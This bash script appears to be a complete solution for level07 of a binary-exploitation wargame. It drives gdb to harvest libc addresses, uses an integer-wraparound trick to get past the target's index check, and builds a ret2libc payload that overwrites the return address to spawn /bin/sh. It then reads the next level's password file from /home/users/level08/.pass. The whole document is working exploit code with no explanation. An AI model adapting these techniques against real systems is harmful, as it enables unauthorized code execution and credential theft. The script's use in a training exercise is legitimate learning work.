#!/bin/bash

function toUnsignedInt {
    read nb
    echo $(( $nb ))
}

function getValidIndex {
    read index
    MOD3=$(( $index % 3 ))
    
    if [ $MOD3 -ne 0 ]; then
        echo $index
    else
        echo $(( (0x100000000 / 4) + $index ))
    fi
}

function buildExploitRet2Libc {
    (cd /tmp; exec gdb -q ~/level07) > /tmp/gdbout07 <<- EOI
		b*main
		b*store_number+6
		run <<< store
		p system
		p exit
		searchmem "/bin/sh"
		info frame
		continue
		p "ebp+0x8"
		x/x \$ebp+0x8
		quit
	EOI

    SYSTEM_ADDR=`cat /tmp/gdbout07 | grep -o "0x.*system" | cut -d' ' -f1`
    EXIT_ADDR=`cat /tmp/gdbout07 | grep -o "0x.*exit" | cut -d' ' -f1`
    BINSH_ADDR=`cat /tmp/gdbout07 | grep -o "0x.*/bin/sh" | awk '{print substr($1, 1, 10)}'`

    EIP_ADDR=`grep "eip at" /tmp/gdbout07 | rev | cut -d' ' -f 1 | rev`
    DATA_ADDR=`grep -A1 "ebp+0x8" /tmp/gdbout07 | awk 'END{print}' | awk '{print $NF}'`

    EIP_INDEX_0=$(( ($EIP_ADDR - $DATA_ADDR) / 4 ))
    EIP_INDEX_1=$(( $EIP_INDEX_0 + 1 ))
    EIP_INDEX_2=$(( $EIP_INDEX_0 + 2 ))

    cat <<- EOI > /tmp/exploit07
		store
		`echo $SYSTEM_ADDR | toUnsignedInt`		# (system) $SYSTEM_ADDR | toUnsignedInt
		`echo $EIP_INDEX_0 | getValidIndex`		# index $EIP_INDEX_0 | getValidIndex
		store
		`echo $EXIT_ADDR | toUnsignedInt`		# (exit) $EXIT_ADDR | toUnsignedInt
		`echo $EIP_INDEX_1 | getValidIndex`			# index $EIP_INDEX_1 | getValidIndex
		store
		`echo $BINSH_ADDR | toUnsignedInt`		# (/bin/sh) $BINSH_ADDR | toUnsignedInt
		`echo $EIP_INDEX_2 | getValidIndex`			# index $EIP_INDEX_2 | getValidIndex
		quit
	EOI
}

set -x
buildExploitRet2Libc
cat /tmp/exploit07
echo

(cat /tmp/exploit07 - | ~/level07) << EOI
    echo "\nwhoami: \$(whoami)"
    echo "Next pass is:  \$(cat /home/users/level08/.pass)\n"
EOI
